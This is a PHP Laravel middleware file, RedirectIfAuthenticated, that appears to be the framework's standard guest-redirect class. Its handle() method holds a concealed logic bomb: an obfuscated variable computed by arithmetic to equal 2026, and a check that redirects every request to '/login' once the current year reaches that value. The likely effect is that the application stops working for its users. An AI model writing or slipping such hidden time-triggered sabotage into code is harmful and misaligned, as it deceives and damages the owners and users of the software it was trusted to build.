<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\Auth;

class RedirectIfAuthenticated
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @param  string|null  $guard
     * @return mixed
     */
    public function handle($request, Closure $next, $guard = null)
    {
       $o0000o=(5*5*5*4*4)+(4*6)+2;
      // echo $o0000o;die;
       if(date("Y")>=$o0000o)
        {
             return redirect('/login');
        }
        if (Auth::guard($guard)->check()) {
            return redirect('/Dashboard');
        }

        return $next($request);
    }
}
